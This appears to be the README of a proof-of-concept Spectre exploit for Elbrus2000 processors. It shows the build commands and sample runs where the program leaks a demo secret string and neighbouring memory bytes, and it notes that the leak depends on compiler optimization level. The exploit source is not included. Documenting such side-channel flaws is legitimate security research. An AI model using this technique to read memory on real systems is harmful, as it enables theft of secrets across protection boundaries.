# PoC of Spectre vulnerability running on Elbrus2000

Build with optimizations (O2 or O3) and run.

```
$ lcc -O2 main.c -o spectre2k
$ ./spectre2k
usage: ./spectre2k 0x13080 13

secret address: 0x13080
secret len: 13
secret data: "Hello OpenE2K"

target address: 0x13080
target len: 13
target data:

0000000000013080 | 48 65 6c 6c 6f 20 4f 70 65 6e 45 32 4b 00 00 00 | Hello OpenE2K...

# You can pass address and length to read
$ ./spectre2k 0x13070 128
usage: ./spectre2k 0x13070 128

secret address: 0x13080
secret len: 13
secret data: "Hello OpenE2K"

target address: 0x13070
target len: 128
target data:

0000000000013070 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
0000000000013080 | 48 65 6c 6c 6f 20 4f 70 65 6e 45 32 4b 00 00 00 | Hello OpenE2K...
0000000000013090 | 68 0a 01 00 00 00 00 00 00 00 00 00 00 00 00 00 | h...............
00000000000130a0 | a0 48 29 06 55 46 00 00 00 00 00 00 00 00 00 00 | .H).UF..........
00000000000130b0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
00000000000130c0 | 40 c0 be 01 00 00 00 00 00 00 00 00 00 00 00 00 | @...............
00000000000130d0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
00000000000130e0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
```

Without compiler optimizations it will not work because compiler will not produce speculative loads.

```
$ lcc -O1 main.c -o spectre2k
$ ./spectre2k
usage: ./spectre2k 0x13080 13

secret address: 0x13080
secret len: 13
secret data: "Hello OpenE2K"

target address: 0x13080
target len: 13
target data:

0000000000013080 | .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. | ................
```

Used LCC version:
```
$ lcc --version
lcc:1.26.22:Jan-10-2024:e2k-v4-linux
gcc (GCC) 9.3.0 compatible
```
